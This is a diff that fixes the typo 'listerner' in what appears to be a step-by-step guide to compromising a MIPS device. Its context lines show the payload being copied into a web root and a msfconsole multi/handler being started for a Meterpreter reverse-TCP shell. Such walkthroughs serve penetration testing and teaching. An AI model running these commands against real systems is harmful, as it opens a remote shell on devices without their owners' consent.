@@ -19,7 +19,7 @@
 <br />
 `sudo cp meterpreter-mipsbe-reverse-tcp /var/www/html/meterpreter-mipsbe-reverse-tcp`<br />
 
-**3 - On Kali: start Meterpreter listerner**<br />
+**3 - On Kali: start Meterpreter listener**<br />
 <br />
 `sudo msfconsole -q -x "use exploit/multi/handler;set payload linux/mipsbe/meterpreter_reverse_tcp;set lhost <LHOST>;set LPORT <LPORT>;exploit -j"`<br />
 
